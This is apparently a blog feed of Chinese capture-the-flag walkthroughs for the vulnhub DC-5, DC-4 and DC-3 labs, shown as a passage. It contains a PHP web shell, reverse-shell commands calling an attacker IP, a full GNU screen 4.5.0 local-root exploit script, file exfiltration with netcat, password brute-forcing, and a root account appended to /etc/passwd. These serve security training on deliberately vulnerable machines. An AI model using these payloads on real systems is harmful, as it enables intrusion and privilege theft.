src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122006456.png" alt="image-20231212200653362"></p><p>成功执行</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>既然可以进行文件包含 我们直接在<code>user-agent</code>中写入shell</p><pre><code>&lt;?php passthru($_GET[&#39;123&#39;]); ?&gt;   // passthru的作用和system类似    使用GET方法123=nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash或者&lt;?php eval($_GET[&#39;123&#39;]); ?&gt;使用GET方法123=system(&#39;nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122047915.png" alt="image-20231212204710758"></p><p>在kali攻击机上监听<code>1111</code>端口</p><pre><code>nc -lvvp 1111</code></pre><p>成功反弹shell</p><p>再创造一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131123536.png" alt="image-20231213112310481"></p><h3 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h3><h4 id="查看suid提权命令"><a href="#查看suid提权命令" class="headerlink" title="查看suid提权命令"></a>查看suid提权命令</h4><p>当前用户<code>www-data</code>还是一个低权限用户 我们先找一下在当前用户可以使用suid提权的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><pre><code>/bin/su            /bin/mount        /bin/umount       /bin/screen-4.5.0 /usr/bin/gpasswd  /usr/bin/procmail  /usr/bin/at        /usr/bin/passwd   /usr/bin/chfn /usr/bin/newgrp        /usr/bin/chsh                /usr/lib/openssh/ssh-keysign       /usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/sbin/mount.nfs</code></pre><p>看到了在DC-4中 我们使用过的老朋友<code>exim4</code>  我们先试试这次<code>exim4</code>是否也可以成功提权</p><h4 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a>exim4提权</h4><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><p>先查看靶机中<code>exim4</code>命令的版本</p><pre><code>exim4 --version</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131307143.png" alt="image-20231213130751087"></p><p>得知是<code>4.84-2</code>的版本</p><p>使用<code>searchsploit</code>找一下漏洞利用脚本</p><pre><code>searchsploit exim 4.8</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131501264.png" alt="image-20231213150149193"></p><p>但是很可惜 并没有找到合适版本的exim4漏洞利用脚本</p><h5 id="2-exim4提权失败"><a href="#2-exim4提权失败" class="headerlink" title="2.exim4提权失败"></a>2.exim4提权失败</h5><h4 id="screen-4-5-0-提权"><a href="#screen-4-5-0-提权" class="headerlink" title="screen-4.5.0 提权"></a>screen-4.5.0 提权</h4><p>在前面查看suid提权命令的时候 还发现一个<code>screen-4.5.0 </code> </p><pre><code>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。screen命令虚拟了一个终端(session)，可在终端内运行命令，多次运行screen命令可以虚拟多个不同的终端；每个session可以开启多个窗口，每个窗口有自己的shell，可以在不同的窗口中同时运行多个命令，每个命令都相当于在前台运行，可以与用户交互；</code></pre><h5 id="1-查找漏洞利用脚本-1"><a href="#1-查找漏洞利用脚本-1" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit screen 4.5.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131517098.png" alt="image-20231213151707051"></p><p>找到两个权限提升的漏洞利用脚本 </p><h5 id="2-将漏洞利用脚本保存到攻击机"><a href="#2-将漏洞利用脚本保存到攻击机" class="headerlink" title="2.将漏洞利用脚本保存到攻击机"></a>2.将漏洞利用脚本保存到攻击机</h5><pre><code>searchsploit -p linux/local/41154.shsearchsploit -p linux/local/41152.txtcp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.shcp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt</code></pre><h5 id="3-查看41154-sh"><a href="#3-查看41154-sh" class="headerlink" title="3.查看41154.sh"></a>3.查看41154.sh</h5><pre><code class="sh">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><h5 id="4-编译libhax-c文件"><a href="#4-编译libhax-c文件" class="headerlink" title="4.编译libhax.c文件"></a>4.编译libhax.c文件</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131546987.png" alt="image-20231213154607953"></p><pre><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131547678.png" alt="image-20231213154753646"></p><h5 id="5-编译rootshell-c文件并删除"><a href="#5-编译rootshell-c文件并删除" class="headerlink" title="5.编译rootshell.c文件并删除"></a>5.编译rootshell.c文件并删除</h5><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131548171.png" alt="image-20231213154859138"></p><pre><code>gcc -o rootshell rootshell.c rm -f rootshell.c</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131550059.png" alt="image-20231213155059019"></p><h5 id="6-另存为新的dc5-sh文件"><a href="#6-另存为新的dc5-sh文件" class="headerlink" title="6.另存为新的dc5.sh文件"></a>6.另存为新的dc5.sh文件</h5><p>将刚才利用到的脚本和命令删除 另存为新的<code>dc5.sh</code>文件</p><pre><code class="sh">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><p>保存的时候 在最后面加上 :set ff&#x3D;unix 防止脚本格式错误</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131608434.png" alt="image-20231213160812384"></p><h5 id="6-下载漏洞脚本到靶机"><a href="#6-下载漏洞脚本到靶机" class="headerlink" title="6.下载漏洞脚本到靶机"></a>6.下载漏洞脚本到靶机</h5><pre><code>wget http://192.168.160.150/rootshellwget http://192.168.160.150/libhax.sowget http://192.168.160.150/dc5.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131558256.png" alt="image-20231213155855211"></p><h5 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h5><p>将这三个文件传给靶机之后 赋予<code>dc5.sh</code>执行权限</p><pre><code>chmod +x dc5.shchmod 777 dc5.sh</code></pre><p>在直接执行就可以得到root权限</p><p>但是我这边会报错 在执行<code>rootshell</code>文件时显示glibc环境不对 可能是编译<code>rootshell</code>文件时的环境版本太高了 但前面的操作步骤是没问题的 解决的话 只能是换一个低版本的环境去编译<code>rootshell</code> </p><p>正常情况下就是可以直接得到root权限 进入root文件夹 看到flag文件了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312142130449.png" alt="image-20231214213017381"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-5靶场通关</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-4</title>
      <link href="/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/12/04/vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-4通关记录"><a href="#vulnhub靶场DC-4通关记录" class="headerlink" title="vulnhub靶场DC-4通关记录"></a>vulnhub靶场DC-4通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points and just like last time, no clues.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先给靶机开启NAT桥接模式  在攻击机中使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041516844.png" alt="image-20231204151608787"></p><p>找打靶机ip</p><pre><code>192.168.160.155</code></pre><p>再进一步扫一下端口</p><pre><code>nmap -A -p- -v 192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041517935.png" alt="image-20231204151733892"></p><pre><code>开放了80端口 存在web服务 使用nginx中间件 版本1.15.10开放了22端口 存在ssh服务 Openss版本7.4p1</code></pre><p>在使用whatweb进行CMS识别 搜集一波信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521721.png" alt="image-20231204152115668"></p><p>在使用dirsearch扫一波目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041641121.png" alt="image-20231204164145053"></p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041521221.png" alt="image-20231204152149183"></p><h4 id="爆破网站登陆密码"><a href="#爆破网站登陆密码" class="headerlink" title="爆破网站登陆密码"></a>爆破网站登陆密码</h4><p>使用bp或者hydra爆破都可以</p><pre><code>hydra -l admin -P /home/kali/Desktop/brutehash/rockyou.txt 192.168.160.155 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; -F</code></pre><pre><code>-l 用户名-L 用户名字典-p 密码-P 密码字典http-post-form 使用http协议下的post方法进行破解&quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;：1.&quot;/&quot;指登陆页面所在目录 该网站的登陆目录在index.php 2.POST提交的内容只是把用户名和密码部分换成了^USER^和^PASS^。USER对应前面的-l 后跟的用户名root，PASS会被字典中的密码逐个替换</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041711268.png" alt="image-20231204171144220"></p><p>密码是happy</p><p>bp爆破就用本机访问一下 抓个包 找几个字典 一秒爆出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041712487.png" alt="image-20231204171250442"></p><p>使用<code>username:admin/password:happy</code>登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041719106.png" alt="image-20231204171902074"></p><p>看起来有一个任意命令执行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041736027.png" alt="image-20231204173657999"></p><p>执行了<code>ls -l</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738462.png" alt="image-20231204173842427"></p><p>执行了<code>du -h</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041738659.png" alt="image-20231204173857621"></p><p>执行了<code>df -h</code></p><p>抓个包看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312041739572.png" alt="image-20231204173927523"></p><p>真是执行了<code>ls -l</code> 同时也看到这里空格是使用<code>+</code>表示的 那我们可以利用这一点反弹shell了</p><h3 id="三、反弹shell"><a href="#三、反弹shell" class="headerlink" title="三、反弹shell"></a>三、反弹shell</h3><p>先开一个终端 监听一下端口</p><pre><code>nc -lvvp 1145</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042027819.png" alt="image-20231204202758687"></p><p>再在bp上写入反弹shell的命令 </p><pre><code>nc 192.168.160.131 4444 -e /bin/bash在这个环境中 空格要使用+代替nc+192.168.160.131+4444+-e+/bin/bash</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042055519.png" alt="image-20231204205554477"></p><p>这边这个ip一定要写攻击机的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042056474.png" alt="image-20231204205638442"></p><p>反弹成功</p><p>在用python创造一个交互式的shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042059878.png" alt="image-20231204205905844"></p><h4 id="找到并提取密码文件"><a href="#找到并提取密码文件" class="headerlink" title="找到并提取密码文件"></a>找到并提取密码文件</h4><p>在home文件夹下查看用户 找到三个用户</p><pre><code>charles jim sam</code></pre><p>在<code>/home/jim/backups</code>下找到一个<code>old-passwords.bak</code> 查看内容 看起来很像字典 使用nc将这个文件保存到本机</p><p>现在攻击机下监听一个端口 指定接受一个文件</p><pre><code>nc -lvvp 5555 &gt; old-passwords.bak</code></pre><p>再在shell里面监听相同的端口 指定发送上面的密码文件</p><pre><code>nc 192.168.160.131 5555 &lt; old-passwords.bak</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042114958.png" alt="image-20231204211415921"></p><p>接收到了</p><h3 id="四、登陆用户"><a href="#四、登陆用户" class="headerlink" title="四、登陆用户"></a>四、登陆用户</h3><h4 id="使用hydra爆破jim用户密码"><a href="#使用hydra爆破jim用户密码" class="headerlink" title="使用hydra爆破jim用户密码"></a>使用hydra爆破jim用户密码</h4><p>可以使用这个字典文件爆破jim用户的密码 还是使用hydra</p><pre><code>hydra -l jim -P old-passwords.bak ssh://192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312042118415.png" alt="image-20231204211835368"></p><p>爆破出密码为&#96;&#96;</p><h4 id="登陆jim用户-发现charles用户密码"><a href="#登陆jim用户-发现charles用户密码" class="headerlink" title="登陆jim用户 发现charles用户密码"></a>登陆jim用户 发现charles用户密码</h4><p>使用刚才爆出来的jim用户密码进行登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051105493.png" alt="image-20231205110555449"></p><p>使用ssh也可以进行连接</p><pre><code>ssh jim@192.168.160.155</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051125436.png" alt="image-20231205112534390"></p><p>提示有一封邮件 </p><p>在<code>/var/mail</code>文件夹下找到邮件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051141626.png" alt="image-20231205114140559"></p><p>这是一封charles发给jim的邮件 从中可以得到charles的登录密码为<code>^xHhA&amp;hvim0y</code></p><h3 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h3><h4 id="使用teehee进行提权"><a href="#使用teehee进行提权" class="headerlink" title="使用teehee进行提权"></a>使用teehee进行提权</h4><p>使用上面得到的密码 切换到charles用户后 查看这个用户有什么可以使用的root命令</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051153811.png" alt="image-20231205115337768"></p><p>发现可以无密码使用teehee</p><p>先看一下用法</p><pre><code>teehee -h</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051415590.png" alt="image-20231205141537541"></p><p><code>-a</code>参数允许往一个文件中追加内容 </p><h5 id="1-x2F-etc-x2F-passwd"><a href="#1-x2F-etc-x2F-passwd" class="headerlink" title="1.&#x2F;etc&#x2F;passwd"></a>1.&#x2F;etc&#x2F;passwd</h5><p>我们可以利用这一点 向<code>/etc/passwd</code>文件中追加一个新的超级用户</p><p>先用openssl生成一个加盐的密码</p><pre><code>openssl passwd -1 -salt 1*2*3 abcd# $1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1</code></pre><p>使用teehee创建超级用户</p><pre><code>echo &#39;abc:$1$1*2*3$GDXeco9uaGB.Q0i0wsFCA1:0:0:root:/bin/bash&#39; |sudo teehee -a /etc/passwd</code></pre><p>登录abc用户 输入密码<code>abcd</code> 成功登录 是root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051426768.png" alt="image-20231205142608726"></p><h5 id="2-x2F-etc-x2F-sudoers"><a href="#2-x2F-etc-x2F-sudoers" class="headerlink" title="2.&#x2F;etc&#x2F;sudoers"></a>2.&#x2F;etc&#x2F;sudoers</h5><p>相同的 我们也可以添加一个超级用户到<code>/etc/sudoers</code>中  </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051526756.png" alt="image-20231205152634690"></p><p>我们可以使用teehee在&#x2F;etc&#x2F;sudoers文件后追加</p><pre><code>charles    ALL=(root) ALL</code></pre><p>输入</p><pre><code>echo &#39;charles    ALL=(root) ALL&#39; |sudo teehee -a /etc/sudoers</code></pre><p>在使用vi提权</p><pre><code>vi privilege.txt输入charles用户密码:!/bin/bash</code></pre><p>在输入</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051538862.png" alt="image-20231205153826818"></p><h4 id="exim4-suid-提权"><a href="#exim4-suid-提权" class="headerlink" title="exim4(suid)提权"></a>exim4(suid)提权</h4><p>首先查看charles用户可以使用suid提权的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051558395.png" alt="image-20231205155804351"></p><p>其中<code>exim4</code>是可以进行提权的</p><p>但是不知道为啥charles用户用不了这个命令 那我们还回到最初的www-data用户</p><pre><code>exim4 --version</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051606235.png" alt="image-20231205160605193"></p><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit exim 4</code></pre><p>找到好几个都可以使用的提权脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051618214.png" alt="image-20231205161805143"></p><p>选择第一个<code>46996.sh</code></p><h5 id="2-利用脚本"><a href="#2-利用脚本" class="headerlink" title="2.利用脚本"></a>2.利用脚本</h5><p>找到脚本的路径</p><pre><code>searchsploit -p 46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051619549.png" alt="image-20231205161924515"></p><p>将脚本复制到桌面</p><pre><code>cp /usr/share/exploitdb/exploits/linux/local/46996.sh 46996.sh </code></pre><p>开启apache服务</p><pre><code>systemctl start apache2.service</code></pre><p>将这个漏洞攻击文件转移到<code>/var/html/www</code>文件夹下</p><pre><code>mv 46996.sh /var/www/html </code></pre><p>将文件下载到靶机<code>/tmp</code>中</p><pre><code>wget http://192.168.160.150/46996.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051630282.png" alt="image-20231205163009242"></p><p>看到此时用户对<code>46996.sh</code>并没有执行权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051631698.png" alt="image-20231205163148657"></p><p>赋予执行权限</p><pre><code>chmod +x 46996.sh</code></pre><p>执行脚本 发现得到root权限</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051633173.png" alt="image-20231205163319129"></p><p>进入到root文件夹下 得到flag</p><pre><code>888       888          888 888      8888888b.                             888 888 888 888 888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 888  d8b  888          888 888      888    888                            888 888 888 888 888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 Congratulations!!!Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all thosewho have provided feedback, and who have taken time to complete these littlechallenges.If you enjoyed this CTF, send me a tweet via @DCAU7.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312051427051.png" alt="image-20231205142713009"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，DC-4靶机打完</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://blog.csdn.net/Deeeelete/article/details/106883762?ops_request_misc=&request_id=&biz_id=102&utm_term=kali%E4%B8%8A%E5%AE%89%E8%A3%85nc&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-106883762.142%5Ev96%5Epc_search_result_base9&spm=1018.2226.3001.4187">kali中nc实现通信、传输文件、反弹shell、python等脚本反弹shell</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场记录DC-3</title>
      <link href="/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/"/>
      <url>/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-3通关wp"><a href="#vulnhub靶场DC-3通关wp" class="headerlink" title="vulnhub靶场DC-3通关wp"></a>vulnhub靶场DC-3通关wp</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.For those with experience doing CTF and Boot2Root challenges, this probably won&#39;t take you long at all (in fact, it could take you less than 20 minutes easily).If that&#39;s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</code></pre><p>这次的靶场描述是有一个flag和一个入口 同时也需要我们获取root权限</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>和之前一样 设置的是NAT桥接模式  和渗透机共享ip  直接nmap扫描存活的主机</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300852153.png" alt="image-20231127223920923"></p><p>发现80端口 找到靶机的ip地址</p><pre><code>192.168.160.153</code></pre><p>进一步扫一下端口信息</p><pre><code>nmap -A -p- -v 192.168.160.153</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300852750.png" alt="image-20231127224442087"></p><p>发现开放的端口很少 只有一个80端口 开放了web服务 使用Apache中间件 版本2.4.18</p><p>在使用whatweb进行CMS识别 在搜集一波信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853935.png" alt="image-20231127225737501"></p><p>发现应该是使用Joomla框架搭建的网站</p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p>直接访问<code>192.168.160.153</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853070.png" alt="image-20231127225320441"></p><pre><code>This time, there is only one flag, one entry point and no clues.To get the flag, you&#39;ll obviously have to gain root privileges.How you get to be root is up to you - and, obviously, the system.Good luck - and I hope you enjoy this little challenge.  :-)</code></pre><p>发现页面有登陆入口 也许是一个突破点 </p><h4 id="dirb扫目录"><a href="#dirb扫目录" class="headerlink" title="dirb扫目录"></a>dirb扫目录</h4><p>这里可以使用<strong>dirb</strong>扫一下目录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853153.png" alt="image-20231127231227172"></p><p>扫到了一个登陆页面 访问一下</p><pre><code>http://192.168.160.153/administrator/   </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853411.png" alt="image-20231127231309195"></p><p>是joomal框架后台登陆页面 </p><h3 id="三、joomla框架sql注入漏洞"><a href="#三、joomla框架sql注入漏洞" class="headerlink" title="三、joomla框架sql注入漏洞"></a>三、joomla框架sql注入漏洞</h3><h4 id="1、msf扫漏洞"><a href="#1、msf扫漏洞" class="headerlink" title="1、msf扫漏洞"></a>1、msf扫漏洞</h4><p>还是和之前一样 使用msf扫一下漏洞</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853231.png" alt="image-20231127230604957"></p><p>有很多rce的漏洞 包括反序列化 文件上传 sql注入 </p><p>我们这里先用模块14扫一下joomla框架版本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853808.png" alt="image-20231127230732196"></p><p>成功扫到框架版本是3.7.0</p><p>既然已经得到了框架版本 那就来看一下这个版本下的框架有什么东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311300853029.png" alt="image-20231127231618785"></p><p>看来是有sql注入的漏洞</p><h4 id="2、使用joomlascan"><a href="#2、使用joomlascan" class="headerlink" title="2、使用joomlascan"></a>2、使用joomlascan</h4><pre><code>（JoomScan）：是一个开源项目，旨在自动执行Joomla CMS部署中的漏洞检测和可靠性保证任务。该工具在Perl中实现，可以无缝轻松地扫描Joomla安装，同时通过其轻量级和模块化架构留下最小的占地面积。它不仅可以检测已知的攻击性漏洞，还能够检测到许多错误配置和管理员级别的缺陷，这些缺陷可被攻击者利用来破坏系统。</code></pre><p>安装</p><pre><code>git clone https://github.com/rezasp/joomscan.gitcd joomscan</code></pre><p>使用</p><pre><code>perl joomla.pl --url 192.168.160.153</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291127071.png" alt="image-20231129112703991"></p><p>其实在这个靶场中 和我们刚刚使用msf扫出来的信息差不太多 也是知道了后台登陆网址 joomla框架信息啥的</p><h4 id="3、searchsploit扫sql注入漏洞脚本"><a href="#3、searchsploit扫sql注入漏洞脚本" class="headerlink" title="3、searchsploit扫sql注入漏洞脚本"></a>3、searchsploit扫sql注入漏洞脚本</h4><p>学一下searchsploit的命令吧</p><pre><code>searchsploit joomla 3.7.0 // 基本搜索searchsploit -t joomla 3.7.0 // 标题搜索 只匹配标题 不匹配路径searchsploit -m 42033.py // 复制到文件夹searchsploit -p 42033.py // 显示了漏洞的完整路径</code></pre><p>使用searchsploit找到了这个版本的joomla框架的sql注入漏洞利用脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202311291137676.png" alt="image-20231129113754624"></p><p>找一下漏洞利用脚本的完整路径</p><pre><code>searchsploit -p 42033.py</code></pre><p><img 